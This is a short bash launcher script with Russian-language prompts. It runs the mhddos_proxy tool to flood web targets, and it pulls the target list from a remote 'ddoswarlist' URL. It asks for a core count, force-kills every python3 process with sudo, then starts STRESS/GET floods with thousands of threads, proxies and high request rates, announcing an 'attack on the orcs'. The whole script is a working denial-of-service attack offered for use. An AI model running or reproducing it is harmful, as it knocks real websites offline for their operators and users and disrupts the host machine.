#!/bin/bash
echo -n "Введите количество ядер что доступно в системе:  "
read item
case "$item" in
    1|2|3|4|5|6|7|8|9|10|12|13|14|15|16) echo "Вы указали $item. Начинаем атаку на орков"
        sudo pkill -9 -f "python3"
	cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods STRESS GET -t $item"000" -p 350 --rpc 2000 --debug
	;;
    *) echo "По умолчанию выбрано одно ядро. Начинаем атаку на орков"
	sudo pkill -9 -f "python3"
	cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods STRESS GET -t 2000 -p 350 --rpc 2000 --debug
	;;
esac
